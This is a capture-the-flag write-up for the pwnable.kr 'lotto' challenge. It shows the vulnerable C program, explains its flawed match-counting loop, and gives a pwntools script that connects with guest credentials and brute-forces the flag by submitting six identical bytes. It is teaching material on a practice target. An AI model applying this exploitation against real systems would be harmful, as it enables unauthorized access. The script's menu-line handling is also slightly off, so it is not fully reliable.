### Analysis

The program is a lottery game where you submit 6 bytes (numbers between 1 and 45). The program generates 6 random numbers in the same range and compares them to your input. If all 6 numbers match, you win and get the flag. However, the comparison logic is flawed: it checks each of your numbers against every number in the random pool, meaning if all your numbers are the same, you can win if any number in the pool matches your repeated number.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

void help(){
        printf("- nLotto Rule -\n");
        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
        printf("your goal is to match lotto numbers as many as you can\n");
        printf("if you win lottery for *1st place*, you will get reward\n");
        printf("for more details, follow the link below\n");
        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
        printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

        // menu
        unsigned int menu;

        while(1){

                printf("- Select Menu -\n");
                printf("1. Play Lotto\n");
                printf("2. Help\n");
                printf("3. Exit\n");

                scanf("%d", &menu);

                switch(menu){
                        case 1:
                                play();
                                break;
                        case 2:
                                help();
                                break;
                        case 3:
                                printf("bye\n");
                                return 0;
                        default:
                                printf("invalid menu\n");
                                break;
                }
        }
        return 0;
}
```

### Exploit

1. **Flaw in Comparison Logic**:
   - The program compares each of your 6 numbers against every number in the random pool.
   - If all 6 of your numbers are the same, and at least one number in the random pool matches your repeated number, the program will incorrectly calculate a match of 6.

2. **Strategy**:
   - Submit 6 identical numbers (e.g., `------` where `-` is a byte representing the same number between 1 and 45).
   - Repeat the process until the random pool contains at least one number matching your repeated number.

### Solution Code

```python
from pwn import *

# Connect to the server
sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = sh.process('./lotto')

# Exploit the flawed comparison logic
for i in range(1000):  # Try up to 1000 times
    # Skip menu prompts
    p.recvlines(3)

    # Select "Play Lotto"
    p.sendline('1')
    p.recvline()  # Skip "Submit your 6 lotto bytes" prompt

    # Submit 6 identical bytes (e.g., '------')
    p.sendline('------')

    # Check the result
    result = p.recvline().decode()
    if 'bad' not in result:
        print('Found the flag!')
        print(p.recv().decode())  # Print the flag
        break

# Close the connection
sh.close()
```

### Final Command

Run the following Python script to exploit the program and retrieve the flag:

```bash
python3 lotto_exploit.py
```
